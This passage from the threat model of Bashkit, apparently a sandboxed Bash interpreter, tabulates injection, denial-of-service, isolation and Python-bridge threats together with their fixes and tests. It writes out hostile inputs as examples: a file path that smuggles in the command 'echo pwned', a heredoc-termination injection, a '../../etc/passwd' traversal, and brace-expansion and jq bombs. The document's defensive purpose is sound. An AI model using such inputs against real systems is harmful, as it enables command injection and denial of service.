| ~~TM-INJ-015~~ | ~~`export` bypasses `is_internal_variable()`~~ | ~~Internal prefix injection via export~~ | ~~Add `is_internal_variable()` check~~ (**FIXED**) |
| ~~TM-INJ-016~~ | ~~`_ARRAY_READ_` prefix not in `is_internal_variable()`~~ | ~~Arbitrary array creation/overwrite via marker injection~~ | ~~Add `_ARRAY_READ_` prefix to `is_internal_variable()`~~ (**FIXED**) |
| TM-INF-017 | `set` and `declare -p` leak internal markers | Internal state disclosure (_NAMEREF_, _READONLY_, _UPPER_, _LOWER_) | Filter `is_internal_variable()` names from output |
| TM-INF-018 | `date` builtin returns real host time | Timezone fingerprinting, timing correlation | `Bash::builder().fixed_epoch(N)` freezes the clock; `Bash::builder().epoch_offset(N)` shifts real-clock by N seconds (mutually exclusive, last call wins). Both implemented via `Date::with_fixed_epoch` / `Date::with_offset_seconds` in `builtins/date.rs`. Default behavior is real clock — embed callers opt in for sandboxing. Regression tests: `tm_inf_018_date::*` in `tests/threat_model_tests.rs`. | **MITIGATED** (opt-in) |
| ~~TM-DOS-041~~ | ~~Brace expansion `{N..M}` unbounded range~~ | ~~OOM via `{1..999999999}` allocating billions of strings~~ | Static parser-time check (`MAX_STATIC_BRACE_RANGE = 100_000` in `parser/budget.rs`) rejects oversized literal ranges with `BraceRangeTooLarge`; runtime fallback in `try_expand_range` (`MAX_BRACE_RANGE = 10_000`) treats remaining oversized ranges as literals (**FIXED**) |
| ~~TM-DOS-042~~ | ~~Brace expansion combinatorial explosion~~ | ~~OOM/stack overflow via `{1..100}{1..100}{1..100}` (1M strings) or `{a,b}{a,b}...` (deep recursion)~~ | `expand_braces` caps total emitted strings (`MAX_BRACE_EXPANSION_TOTAL = 100_000`). The count cap alone was insufficient for comma-lists: it is only charged on recursion *return*, so the first DFS path descended one frame per group with the count still zero and stack-overflowed. Now also bounds recursion depth and cumulative output bytes (`MAX_EXPANSION_RESULT_BYTES`) so it degrades to a bounded literal result (**FIXED**) |
| ~~TM-DOS-043~~ | ~~Arithmetic overflow in `execute_arithmetic_with_side_effects`~~ | ~~Panic (DoS) in debug mode via `((x+=1))` with x=i64::MAX~~ | ~~Use `wrapping_add/sub/mul`~~ (**FIXED**) |
| ~~TM-DOS-044~~ | ~~Lexer `read_command_subst_into` stack overflow~~ | ~~Process crash (SIGABRT) via ~50 nested `$()` in double-quotes~~ | ~~Add depth parameter to `read_command_subst_into()`~~ (**FIXED**) |
| ~~TM-DOS-045~~ | ~~OverlayFs `symlink()` bypasses all limits~~ | ~~Unlimited symlink creation despite `max_file_count`~~ | ~~Add `check_write_limits()` + `validate_path()` to symlink~~ — overlay symlink path enforces limits (**FIXED**) |
| ~~TM-DOS-046~~ | ~~MountableFs has zero `validate_path()` calls~~ | ~~Path validation completely bypassed for mounted filesystems~~ | ~~Add `validate_path()` to all FileSystem methods~~ — `MountableFs::validate_path` runs before every delegation (**FIXED**) |
| ~~TM-DOS-047~~ | ~~InMemoryFs `copy()` skips limit check when dest exists~~ | ~~Total VFS bytes can exceed `max_total_bytes`~~ | ~~Always call `check_write_limits()`, accounting for size delta~~ (**FIXED**) |
| ~~TM-DOS-048~~ | ~~InMemoryFs `rename()` overwrites dirs, orphans children~~ | ~~VFS corruption — orphaned entries consume memory but are unreachable~~ | ~~Check dest type in `rename()`, reject file-over-directory per POSIX~~ (**FIXED**) |
| ~~TM-DOS-049~~ | ~~`collect_dirs_recursive` has no depth limit~~ | ~~Deep recursion on VFS trees~~ | ~~Add explicit depth parameter~~ — capped using `FsLimits::max_path_depth` (**FIXED**) |
| ~~TM-DOS-050~~ | ~~`parse_word_string` uses default parser limits~~ | ~~Caller-configured tighter limits ignored for parameter expansion~~ | ~~Propagate limits through `parse_word_string()`~~ (**FIXED**) |
| ~~TM-PY-028~~ | ~~BashTool.reset() in Python drops security config~~ | ~~Resource limits silently removed after reset~~ | ~~Preserve limits like `PyBash.reset()` does~~ — `BashTool::reset` rebuilds via `replace_live_bash_with_builder` matching `PyBash::reset` (**FIXED**) |
| TM-PY-029 | ContextVar capture may include sensitive state | `copy_context()` snapshots all caller ContextVars, not just intended ones | Accepted: same semantics as `asyncio.Task` context inheritance; caller controls what is set |

### Open (From 2026-03 Blackbox Security Testing)

| Threat ID | Vulnerability | Impact | Recommendation |
|-----------|---------------|--------|----------------|
| ~~TM-DOS-056~~ | ~~`source` self-recursion stack overflow~~ | ~~Process crash (SIGABRT) via script that sources itself~~ | ~~Track source depth like function depth; apply `max_function_depth` limit~~ (**FIXED**) |
| ~~TM-DOS-057~~ | ~~`sleep` bypasses execution timeout~~ | ~~CPU/time exhaustion; `sleep`, subshell sleep, pipeline sleep, background sleep, `timeout` builtin all ignore `ExecutionLimits::timeout`~~ | ~~Implement timeout as tokio::time::timeout wrapper around exec(), not cooperative check~~ (**FIXED**) |
| ~~TM-DOS-058~~ | ~~Single-builtin unbounded output~~ | ~~OOM via `seq 1 1000000` producing 1M lines despite command limit of 50~~ | ~~Add `max_stdout_bytes` / `max_stderr_bytes` to ExecutionLimits~~ (**FIXED**) |
| ~~TM-INJ-019~~ | ~~`unset` removes readonly variables~~ | ~~Integrity bypass — readonly protection defeated~~ | ~~Check readonly attribute in unset before removal~~ (**FIXED**) |
| ~~TM-INJ-020~~ | ~~`declare` overwrites readonly variables~~ | ~~Integrity bypass — `declare X=new` overwrites `readonly X=old`~~ | ~~Check readonly attribute in declare assignment path~~ (**FIXED**) |
| ~~TM-INJ-021~~ | ~~`export` overwrites readonly variables~~ | ~~Integrity bypass — `export X=new` overwrites `readonly X=old`~~ | ~~Check readonly attribute in export assignment path~~ (**FIXED**) |
| ~~TM-ISO-021~~ | ~~EXIT trap leaks across `exec()` calls~~ | ~~Cross-invocation interference — trap from exec N fires in exec N+1~~ | ~~Reset traps in `reset_for_execution()`~~ — `reset_transient_state()` clears `traps` (**FIXED**) |
| ~~TM-ISO-022~~ | ~~`$?` leaks across `exec()` calls~~ | ~~State pollution — exit code from previous exec visible to next exec~~ | ~~Reset `last_exit_code` in `reset_for_execution()`~~ — `reset_transient_state()` zeroes `last_exit_code` (**FIXED**) |
| TM-ISO-023 | `set -e` leaks across `exec()` calls | Unexpected abort — `set` options from previous exec affect next exec | `SET_OPTION_VARS` cleared in `reset_transient_state()` (**FIXED**) |
| ~~TM-ISO-024~~ | ~~`$?` leaks into VFS subprocess~~ | ~~Parent `last_exit_code` visible inside VFS script subprocess, causing false `set -e` failures~~ | ~~Reset `last_exit_code = 0` and `nounset_error = None` in `execute_script_content` subprocess isolation~~ (**FIXED**) |
| ~~TM-INT-007~~ | ~~`/dev/urandom` empty with `head -c`~~ | ~~Weak randomness — `head -c 16 /dev/urandom` returns empty string~~ | ~~Fix virtual device pipe handling in head builtin~~ — `read_file_for_builtin` reads virtual devices as Latin-1 (**FIXED**) |
| ~~TM-DOS-044~~ | ~~Nested `$()` stack overflow (regression)~~ | ~~Process crash (SIGABRT) at depth ~50 despite #492 fix~~ | ~~Interpreter execution path may need separate depth tracking from lexer fix~~ — depth-50 nested-subst test (`finding_nested_cmd_subst_stack_overflow::depth_50_is_bounded`) passes (**FIXED**) |
| TM-DOS-088 | Command substitution OOM via state cloning | OOM at depth N (memory ≈ N × state_size) | Dedicated `max_subst_depth` limit (default 32), separate from `max_function_depth` — **FIXED** via #1088 |
| TM-DOS-089 | Command substitution stack overflow via inlined futures | SIGABRT at ~20-30 nested $() levels | Box::pin `expand_word` and `execute_cmd_subst` to cap per-level stack — **FIXED** via #1089 |
| ~~TM-DOS-090~~ | ~~`shuf` unbounded range/repeat materialization~~ | ~~OOM/CPU exhaustion via huge `--input-range` or `--head-count` before stdout truncation~~ | ~~Sample numeric ranges without full collection and reject output that exceeds `ExecutionLimits` before allocation~~ — `shuf_resource_tests` cover huge range `-n 1` and repeat output caps (**FIXED**) |
| TM-DOS-091 | SQLite `.dump` cumulative output bypass | `.dump` built the full schema+rows string before checking `max_output_bytes`; an attacker controlling many tables/rows could cause memory to grow far beyond the configured output cap | `bounded_append()` helper enforces the cap after each schema line and each INSERT row; `dispatch()` receives the *remaining* budget (`max_output_bytes - stdout.len()`) from `run_statements` — **FIXED** via #1869 |
| TM-DOS-092 | Subshell snapshot amplification | Deeply nested `( ... )` keeps CoW state snapshots and call-stack clones alive | `max_subshell_depth` counter (default 32) bounds live explicit subshell snapshots | **MITIGATED** |
| TM-DOS-093 | jq unbounded generator OOM/hang | `jq -n 'repeat(1)'` / `range(0;1e18)` — the jaq result loop appended every value to an in-memory string with no byte/value/deadline cap; jaq's iterator is synchronous so the async execution timeout cannot preempt it. jq is a core builtin (no opt-in gate) | Cap accumulated output at the caller's `max_stdout_bytes` and poll `ExecutionDeadline::is_expired()` every 4096 values, aborting with a clean error (`builtins/jq/mod.rs`) — **FIXED** |

### Accepted (Low Priority)

| Threat ID | Vulnerability | Impact | Rationale |
|-----------|---------------|--------|-----------|
| TM-DOS-011 | Symlinks not followed | Functionality gap | By design - prevents symlink attacks |
| TM-DOS-025 | Regex backtracking | CPU exhaustion | Linear-time `regex` engine by default; fancy-regex paths (`grep -P`, `sed`) capped by `FANCY_BACKTRACK_LIMIT` |
| TM-DOS-033 | AWK unbounded loops | CPU exhaustion | 30s timeout backstop |
| TM-UNI-004 | Zero-width chars in variable names | Variable confusion | Matches Bash behavior |
| TM-UNI-006 | Homoglyph filenames | Visual confusion | Impractical to fully detect |
| TM-UNI-008 | Normalization bypass | Duplicate filenames | Matches Linux FS behavior |
| TM-UNI-014 | Bidi overrides in script source | Trojan Source | Scripts are untrusted by design |

---

## Security Controls Matrix

| Control | Threat IDs | Implementation | Tested |
|---------|------------|----------------|--------|
| Input size limit (10MB) | TM-DOS-001 | `limits.rs` | Yes |
| Command limit (10K) | TM-DOS-002, TM-DOS-004, TM-DOS-019 | `limits.rs` | Yes |
| Loop limit (10K) | TM-DOS-016, TM-DOS-017 | `limits.rs` | Yes |
| Total loop limit (1M) | TM-DOS-018 | `limits.rs` | Yes |
| Function depth (100) | TM-DOS-020, TM-DOS-021 | `limits.rs` | Yes |
| Parser timeout (5s) | TM-DOS-024 | `limits.rs` | Yes |
| Parser fuel (100K ops) | TM-DOS-024 | `limits.rs` | Yes |
| AST depth limit (100) | TM-DOS-022 | `limits.rs` | Yes |
| Child parser limit propagation | TM-DOS-021 | `parser/mod.rs` | Yes |
| Arithmetic depth limit (50) | TM-DOS-026 | `interpreter/mod.rs` | Yes |
| Builtin parser depth limit (100) | TM-DOS-027 | `builtins/awk.rs`, `builtins/jq/` | Yes |
| Execution timeout (30s) | TM-DOS-023 | `limits.rs` | Yes |
| Builtin output pre-allocation caps | TM-DOS-058, TM-DOS-090 | `limits.rs`, `builtins/shuf.rs` | Yes |
| Persistent custom fd cap | TM-DOS-063 | `limits.rs`, `interpreter/mod.rs` | Yes |
| Virtual filesystem | TM-ESC-001, TM-ESC-003 | `fs/memory.rs` | Yes |
| Filesystem limits | TM-DOS-005 to TM-DOS-010, TM-DOS-014 | `fs/limits.rs` | Yes |
| Path depth limit (100) | TM-DOS-012 | `fs/limits.rs` | Yes |
| Filename length limit (255) | TM-DOS-013 | `fs/limits.rs` | Yes |
| Path length limit (4096) | TM-DOS-013 | `fs/limits.rs` | Yes |
| Path char validation | TM-DOS-015 | `fs/limits.rs` | Yes |
| Zip bomb protection | TM-DOS-007, TM-NET-013 | `builtins/archive.rs` | Yes |
| Path normalization | TM-ESC-001, TM-INJ-005 | `fs/memory.rs` | Yes |
| No symlink following | TM-ESC-002, TM-DOS-011 | `fs/memory.rs` | Yes |
| Network allowlist | TM-INF-010, TM-NET-001 to TM-NET-007 | `network/allowlist.rs` | Yes |
| Domain allowlist | TM-NET-015, TM-NET-016, TM-NET-017 | `network/allowlist.rs` | Planned |
| Sandboxed eval/bash/sh, no exec | TM-ESC-005 to TM-ESC-008, TM-ESC-015, TM-INJ-003 | `interpreter/mod.rs` | Yes |
| Fail-point testing | All controls | `security_failpoint_tests.rs` | Yes |
| Builtin panic catching | TM-INT-001, TM-INT-002, TM-INT-006 | `interpreter/mod.rs` | Yes |
| Date format validation | TM-INT-003 | `builtins/date.rs` | Yes |
| Error message sanitization | TM-INT-004, TM-INT-005 | `error.rs` | Yes |
| HTTP response size limit | TM-NET-008, TM-NET-012 | `network/client.rs` | Yes |
| HTTP connect timeout | TM-NET-009 | `network/client.rs` | Yes |
| HTTP read timeout | TM-NET-010 | `network/client.rs` | Yes |
| No auto-redirect | TM-NET-011, TM-NET-014 | `network/client.rs` | Yes |
| No host proxy | TM-NET-015 | `network/client.rs` | Yes |
| Log value redaction | TM-LOG-001 to TM-LOG-004 | `logging.rs` | Yes |
| Log injection prevention | TM-LOG-005, TM-LOG-006 | `logging.rs` | Yes |
| Log value truncation | TM-LOG-007, TM-LOG-008 | `logging.rs` | Yes |
| Python resource limits | TM-PY-001 to TM-PY-003 | `builtins/python.rs` | Yes |
| SQLite opt-in and limits | TM-SQL-001 to TM-SQL-011 | `builtins/sqlite/` | Yes |
| Path char validation (bidi) | TM-DOS-015, TM-UNI-003, TM-UNI-011 | `fs/limits.rs` | Partial (bidi yes, zero-width/tags no) |
| Builtin panic catching | TM-INT-001, TM-UNI-001, TM-UNI-002, TM-UNI-015, TM-UNI-016, TM-UNI-017 | `interpreter/mod.rs` | Yes (catch_unwind) |

### Open Controls (From 2026-03 Security Audit)

| Finding | Threat IDs | Required Control | Status |
|---------|------------|------------------|--------|
| Wrapping arithmetic | TM-DOS-029 | `wrapping_*` ops, clamp shift/exponent | **MITIGATED** |
| VFS limit enforcement on public API | TM-ESC-012 | `validate_path()` + `check_write_limits()` in `add_file()` / `restore()` | **MITIGATED** |
| Custom jaq env function | TM-INF-013, TM-ISO-004 | Read from `ctx.env`/`ctx.variables`, not `std::env` | **DONE** |
| Internal variable namespace isolation | TM-INJ-009 | `is_internal_variable()` rejection in every write path; `set` / `declare -p` filter | **MITIGATED** |
| Parser limit propagation | TM-DOS-030 | `Parser::with_limits()` in eval/source/trap/alias | **MITIGATED** |
| ExtGlob depth limit | TM-DOS-031 | Depth parameter in `glob_match_impl` (`interpreter/glob.rs:162,324`) | **MITIGATED** |
| Python wrapper input sanitization | TM-PY-023, TM-PY-024 | `shlex.quote()` on every interpolated path; per-call random heredoc delimiter via `secrets.token_hex(8)` | **MITIGATED** |
| Tar path validation | TM-INJ-010 | Resolved-path check + `starts_with(&extract_base)` in `archive.rs` | **MITIGATED** |
| Git branch name validation | TM-GIT-014 | `validate_ref_name` rejects `..`, control chars, leading `/`, trailing `.lock` | **MITIGATED** |
| GIL release in execute_sync | TM-PY-025 | `Python::allow_threads()` around every `rt.block_on` in `bashkit-python/src/lib.rs` | **MITIGATED** |
| TOCTOU fix in append_file | TM-DOS-034 | Single write lock for read-check-write | **DONE** |
| OverlayFs combined limit accounting | TM-DOS-035, TM-DOS-036 | Use combined usage for limit checks, subtract overrides | **NEEDED** |
| OverlayFs chmod CoW limits | TM-DOS-037 | Route copy-on-write through `check_write_limits()` | **NEEDED** |
| OverlayFs recursive whiteout | TM-DOS-038 | Check ancestor whiteouts in `is_whiteout()` | **NEEDED** |
| VFS-wide path validation | TM-DOS-039 | `validate_path()` in all path-accepting methods | **NEEDED** |
| Custom builtin preservation | TM-ESC-014 | Clone builtins instead of `std::mem::take` | **DONE** |
| Python config preservation on reset | TM-PY-026 | `PyBash::reset` and `BashTool::reset` rebuild via `replace_live_bash_with_builder` | **MITIGATED** |
| JSON conversion depth limit | TM-PY-027 | `MAX_NESTING_DEPTH = 64` in `json_to_py_inner` / `py_to_json_inner` | **MITIGATED** |
| Cyclic nameref detection | TM-INJ-011 | Visited-set in `resolve_nameref()` breaks the cycle and returns the original name | **MITIGATED** |
| Error message sanitization gaps | TM-INF-016 | Consistent Display format, wrap external errors | **DONE** |
| 32-bit integer safety | TM-DOS-040 | `usize::try_from()` for `u64` casts in `network/client.rs` and `bashkit-python/src/lib.rs` | **MITIGATED** |

### Open Controls (From 2026-03 Deep Audit)

| Finding | Threat IDs | Required Control | Status |
|---------|------------|------------------|--------|
| Internal prefix injection via builtins | TM-INJ-012 to TM-INJ-015 | Add `is_internal_variable()` check to `declare`, `readonly`, `local`, `export` | **NEEDED** |
| Missing `_ARRAY_READ_` in prefix guard | TM-INJ-016 | Add prefix to `is_internal_variable()` | **NEEDED** |
| Internal marker info leak | TM-INF-017 | Filter internal vars from `set` and `declare -p` output | **NEEDED** |
| Brace expansion DoS | TM-DOS-041, TM-DOS-042 | Cap range size and total expansion count | **MITIGATED** |
| Arithmetic overflow in compound assignment | TM-DOS-043 | Use `wrapping_*` ops in `execute_arithmetic_with_side_effects` | **NEEDED** |
| Lexer stack overflow | TM-DOS-044 | Depth tracking in `read_command_subst_into` (lexer) + interpreter call-depth counter | **MITIGATED** |
| Cmd subst OOM via state cloning | TM-DOS-088 | `max_subst_depth` limit in `ExecutionLimits` | **DONE** |
| OverlayFs symlink limit bypass | TM-DOS-045 | `check_write_limits()` + `validate_path()` in `symlink()` | **MITIGATED** |
| MountableFs path validation gap | TM-DOS-046 | `validate_path()` in all MountableFs methods | **MITIGATED** |
| VFS copy/rename semantic bugs | TM-DOS-047, TM-DOS-048 | Fix limit check in copy(), type check in rename() | **MITIGATED** |
| Date time info leak | TM-INF-018 | `fixed_epoch` + `epoch_offset` builder methods (opt-in) | **MITIGATED** |
| Python BashTool.reset() drops limits | TM-PY-028 | `BashTool::reset` rebuilds via `replace_live_bash_with_builder` matching `PyBash::reset` | **MITIGATED** |
| YAML parser depth limit | TM-DOS-051 | `depth` parameter on `parse_yaml_block`/`map`/`list` with `MAX_YAML_DEPTH = 100` | **MITIGATED** |
| Template engine depth limit | TM-DOS-052 | `depth` parameter on `render_template_inner` with `MAX_TEMPLATE_DEPTH = 100` | **MITIGATED** |
| Unzip path traversal validation | TM-INJ-017 | `validate_extract_entry_path` rejects non-`Normal` components in `zip_cmd.rs` | **MITIGATED** |
| Dotenv internal variable guard | TM-INJ-018 | `is_internal_variable()` check in `Dotenv::execute` (`builtins/dotenv.rs:138`) | **MITIGATED** |
| Session-level cumulative counters | TM-ISO-005 | `SessionLimits` caps cumulative commands and `exec()` calls across the lifetime of a `Bash` instance | **MITIGATED** |
| Per-instance memory budget | TM-ISO-006 | `MemoryLimits` capping variable count, total bytes, array entries, function count, function body bytes | **MITIGATED** |
| jq file binding amplification | TM-DOS-062 | `MAX_FILE_VAR_REQUESTS` and `MAX_FILE_VAR_BYTES` bound `--rawfile` / `--slurpfile` globals | **MITIGATED** |
| Heredoc suffix re-injection CPU amplification | TM-DOS-064 | Charge re-injected heredoc rest-of-line suffix length to parser fuel | **MITIGATED** |

---

## Recommended Limits for Production

All execution counters reset per `exec()` call. Each script invocation gets a fresh
budget; hitting a limit in one call does not affect subsequent calls on the same instance.

```rust
ExecutionLimits::new()
    .max_commands(10_000)              // Per-exec() (TM-DOS-002, TM-DOS-004, TM-DOS-019)
    .max_loop_iterations(10_000)       // TM-DOS-016, TM-DOS-017
    .max_total_loop_iterations(1_000_000) // TM-DOS-018 (nested loop cap)
    .max_function_depth(100)           // TM-DOS-020, TM-DOS-021
    .timeout(Duration::from_secs(30))  // TM-DOS-023
    .parser_timeout(Duration::from_secs(5))  // TM-DOS-024
    .max_input_bytes(10_000_000)       // TM-DOS-001 (10MB)
    .max_ast_depth(100)                // TM-DOS-022 (also inherited by child parsers: TM-DOS-021)
    .max_parser_operations(100_000)    // TM-DOS-024 (also inherited by child parsers: TM-DOS-021)
// Note: MAX_ARITHMETIC_DEPTH (50) is a compile-time constant in interpreter (TM-DOS-026)
// Note: MAX_AWK_PARSER_DEPTH (100) is a compile-time constant in builtins/awk.rs (TM-DOS-027)
// Note: MAX_JQ_JSON_DEPTH (100) is a compile-time constant in builtins/jq/ (TM-DOS-027)
// Note: MAX_FILE_VAR_REQUESTS (128) and MAX_FILE_VAR_BYTES (16MiB) cap jq file bindings (TM-DOS-062)

// Path validation limits (applied via FsLimits):
FsLimits::new()
    .max_path_depth(100)           // TM-DOS-012
    .max_filename_length(255)      // TM-DOS-013
    .max_path_length(4096)         // TM-DOS-013
// Note: validate_path() also rejects control chars and bidi overrides (TM-DOS-015)
```

---

## Caller Responsibilities

| Responsibility | Related Threats | Description |
|---------------|-----------------|-------------|
| Sanitize env vars | TM-INF-001, TM-INF-019, TM-INF-020 | Don't pass secrets to untrusted scripts (envsubst/template also expose env) |
| Use network allowlist | TM-INF-010, TM-NET-* | Default denies all network access |
| Sanitize output | TM-INJ-008 | Filter terminal escapes if displaying output |
| Set appropriate limits | TM-DOS-* | Tune limits for your use case |
| Sanitize displayed filenames | TM-UNI-003, TM-UNI-006, TM-UNI-011 | Strip zero-width/invisible/confusable chars before showing to users |
| Bidi sanitize script display | TM-UNI-014 | Strip bidi overrides if displaying script source to code reviewers |

---

## Testing Coverage

| Threat Category | Unit Tests | Fail-Point Tests | Threat Model Tests | Fuzz Tests | Proptest |
|----------------|------------|------------------|-------------------|------------|----------|
| Resource limits | ✅ | ✅ | ✅ | ✅ | ✅ |
| Filesystem escape | ✅ | ✅ | ✅ | - | ✅ |
| Injection attacks | ✅ | ❌ | ✅ | ✅ | ✅ |
| Information disclosure | ✅ | ✅ | ✅ | - | - |
| Network bypass | ✅ | ❌ | ✅ | - | - |
| HTTP attacks | ✅ | ❌ | ✅ | - | - |
| Multi-tenant isolation | ✅ | ❌ | ✅ | - | - |
| Parser edge cases | ✅ | ❌ | ✅ | ✅ | ✅ |
| Custom builtin errors | ✅ | ✅ | ✅ | - | - |
| Logging security | ✅ | ❌ | ✅ | - | ✅ |
| Unicode security | ✅ | ❌ | ✅ | ❌ | ❌ |

**Test Files**:
- `tests/threat_model_tests.rs` - 117 threat-based security tests
- `tests/unicode_security_tests.rs` - Unicode security tests (TM-UNI-*)
- `tests/security_failpoint_tests.rs` - Fail-point injection tests
- `tests/builtin_error_security_tests.rs` - Custom builtin error handling tests (39 tests)
- `tests/network_security_tests.rs` - HTTP security tests (53 tests: allowlist, size limits, timeouts)
- `tests/logging_security_tests.rs` - Logging security tests (redaction, injection)

**Recommendations**:
- Add cargo-fuzz for parser and input handling
- Add proptest for Unicode string generation against builtin parsers (TM-UNI-001, TM-UNI-002, TM-UNI-015, TM-UNI-016, TM-UNI-017)
- Add fuzz target for awk/sed/expr/printf/cut/tr with multi-byte Unicode input
- Add property tests for network allowlist with multi-byte URL paths (TM-UNI-019)

---

## Security Tooling

This section documents the security tools used to detect and prevent vulnerabilities in Bashkit.

### Static Analysis Tools

| Tool | Purpose | CI Integration | Frequency |
|------|---------|----------------|-----------|
| **cargo-audit** | CVE scanning for dependencies | ✅ Required | Every PR |
| **cargo-deny** | License + advisory checks | ✅ Required | Every PR |
| **cargo-clippy** | Lint with security-focused warnings | ✅ Required | Every PR |
| **cargo-geiger** | Count unsafe code blocks | ✅ Informational | Every PR |

**cargo-audit**: Scans `Cargo.lock` against RustSec Advisory Database for known vulnerabilities.
```bash
cargo audit
```

**cargo-geiger**: Tracks unsafe code usage to ensure it remains minimal and audited.
```bash
cargo geiger --all-features
```

### Dynamic Analysis Tools

| Tool | Purpose | CI Integration | Frequency |
|------|---------|----------------|-----------|
| **cargo-fuzz** | LibFuzzer-based fuzzing | ✅ Scheduled | Nightly/Weekly |
| **Miri** | Undefined behavior detection | ✅ Required | Every PR |
| **proptest** | Property-based testing | ✅ Required | Every PR |

**cargo-fuzz**: Finds crashes, hangs, and memory issues in parser and interpreter.
```bash
cargo +nightly fuzz run parser_fuzz -- -max_total_time=300
```

**Miri**: Detects undefined behavior in unsafe code blocks.
```bash
cargo +nightly miri test --lib
```

**proptest**: Generates random inputs to test invariants and boundary conditions.
```rust
proptest! {
    #[test]
    fn parser_handles_arbitrary_input(s in ".*") {
        // Should not panic on any input
        let _ = parse(&s);
    }
}
```

### Memory Safety Tools

| Tool | Purpose | When to Use |
|------|---------|-------------|
| **AddressSanitizer (ASAN)** | Memory errors, buffer overflow | Local testing, CI (optional) |
| **Miri** | UB detection in unsafe code | CI required |
| **cargo-careful** | Extra UB checks | Local development |

### Supply Chain Security

| Tool | Purpose | CI Integration |
|------|---------|----------------|
| **cargo-audit** | Known CVE detection | ✅ Required |
| **cargo-deny** | License compliance | ✅ Required |
| **Dependabot** | Automated dependency updates | GitHub-native |

### Fuzzing Targets

The following components are fuzz-tested for robustness:

| Target | File | Threats Mitigated |
|--------|------|-------------------|
| Parser | `fuzz/fuzz_targets/parser_fuzz.rs` | V3 (parser hang), V4 (parser recursion) |
| Lexer | `fuzz/fuzz_targets/lexer_fuzz.rs` | Tokenization crashes |
| Arithmetic | `fuzz/fuzz_targets/arithmetic_fuzz.rs` | Integer overflow, parsing errors |
| Pattern matching | `fuzz/fuzz_targets/glob_fuzz.rs` | Glob/regex DoS |

### Vulnerability Detection Matrix

| Vulnerability | cargo-audit | cargo-fuzz | Miri | proptest | ASAN |
|--------------|-------------|------------|------|----------|------|
| Known CVEs | ✅ | - | - | - | - |
| Parser crashes | - | ✅ | - | ✅ | ✅ |
| Stack overflow | - | ✅ | ✅ | - | ✅ |
| Buffer overflow | - | ✅ | ✅ | - | ✅ |
| Undefined behavior | - | - | ✅ | - | - |
| Integer overflow | - | ✅ | ✅ | ✅ | - |
| Infinite loops | - | ✅ | - | ✅ | - |
| Memory leaks | - | ✅ | - | - | ✅ |

---

## Python / Monty Security (TM-PY)

> **Experimental.** Monty is an early-stage Python interpreter that may have
> undiscovered crash or security bugs. Resource limits are enforced by Monty's
> runtime. This integration should be treated as experimental.

Bashkit embeds the Monty Python interpreter (pydantic/monty) with VFS bridging.
Python `pathlib.Path` and `open()` operations are bridged to Bashkit's virtual
filesystem via Monty's OsCall pause/resume mechanism. This section covers
threats specific to the Python builtin.

### Architecture

```
Python code → Monty VM → OsCall pause → Bashkit VFS bridge → resume
```

Monty never touches the real filesystem. All `Path.*` and `open()` operations
yield `OsCall` events that Bashkit intercepts and dispatches to the VFS.

### Threats

| ID | Threat | Severity | Mitigation | Test |
|----|--------|----------|------------|------|
| TM-PY-001 | Infinite loop via `while True` | High | Monty time limit (30s) + allocation cap | `threat_python_infinite_loop` |
| TM-PY-002 | Memory exhaustion via large allocation | High | Monty max_memory (64MB) + max_allocations (1M) | `threat_python_memory_exhaustion` |
| TM-PY-003 | Stack overflow via deep recursion | High | Monty max_recursion (200) + parser depth limit (200, since 0.0.4) | `threat_python_recursion_bomb` |
| TM-PY-004 | Shell escape via os.system/subprocess | Critical | Monty has no os.system/subprocess implementation | `threat_python_no_os_operations` |
| TM-PY-005 | Real filesystem access via open() | Critical | VFS bridge opens only Bashkit VFS files, not host files | `threat_python_no_filesystem` |
| TM-PY-006 | Error info leakage via stdout | Medium | Errors go to stderr, not stdout | `threat_python_error_isolation` |
| TM-PY-015 | Real filesystem read via pathlib | Critical | VFS bridge reads only from Bashkit VFS, not host | `threat_python_vfs_no_real_fs` |
| TM-PY-016 | Real filesystem write via pathlib | Critical | VFS bridge writes only to Bashkit VFS | `threat_python_vfs_write_sandboxed` |
| TM-PY-017 | Path traversal (../../etc/passwd) | High | VFS resolves paths within sandbox boundaries | `threat_python_vfs_path_traversal` |
| TM-PY-018 | Bash/Python VFS isolation breach | Medium | Shared VFS by design; no cross-tenant access | `threat_python_vfs_bash_python_isolation` |
| TM-PY-019 | Crash on missing file | Medium | FileNotFoundError raised, not panic | `threat_python_vfs_error_handling` |
| TM-PY-020 | Network access from Python | Critical | Monty has no socket/network module | `threat_python_vfs_no_network` |
| TM-PY-021 | VFS mkdir escape | Medium | mkdir operates only in VFS | `threat_python_vfs_mkdir_sandboxed` |
| TM-PY-022 | Parser/VM crash kills host | Critical | Parser depth limit (since 0.0.4) prevents parser crashes; Monty runs in-process with resource limits | — (removed: subprocess tests no longer applicable) |
| TM-PY-023 | Shell injection in Python wrapper | High | Every shell command in `bashkit-python/bashkit/deepagents.py` (read/write/ls/find/grep/etc.) wraps user-supplied paths in `shlex.quote(...)` before f-string interpolation | **MITIGATED** |
| TM-PY-024 | Heredoc content injection | High | `deepagents.py` write() builds a per-call random delimiter (`BASHKIT_EOF_<hex>` via `secrets.token_hex(8)`), so content containing the literal `BASHKIT_EOF` cannot terminate the heredoc | **MITIGATED** |
| TM-PY-025 | GIL deadlock in execute_sync | High | `execute_sync()` calls `rt.block_on()` without releasing GIL; tool callbacks reacquire GIL | **MITIGATED** |

**TM-PY-023**: `crates/bashkit-python/bashkit/deepagents.py` constructs shell commands via f-string
interpolation of user-supplied paths/content (lines 187, 198, 206, 230, 258, 278, 302). Paths
like `/dev/null; echo pwned > /file` execute injected commands. Fix: use `shlex.quote()` or
expose direct VFS methods.

**TM-PY-024**: The `write()` method uses `cat > {file_path} << 'BASHKIT_EOF'\n{content}\nBASHKIT_EOF`.
Content containing `BASHKIT_EOF` on its own line terminates the heredoc early, executing remaining
text as shell commands. Fix: random delimiter suffix or direct write API.

**TM-PY-025** (mitigated): every blocking-on-tokio entry point in
`crates/bashkit-python/src/lib.rs` now wraps the `rt.block_on(...)` call with
`Python::allow_threads(...)` (see `execute_sync`, `reset`, `snapshot`, and the
`BashTool` equivalents). Tool callbacks that re-enter Python no longer race the
caller's GIL hold.

| TM-PY-026 | reset() discards security config | `BashTool.reset()` creates new `Bash` with bare builder, dropping all configured limits | `PyBash::reset` and `BashTool::reset` rebuild via `replace_live_bash_with_builder` + `build_live_builder`, which preserves the original limits, env, and registered builtins | **MITIGATED** |
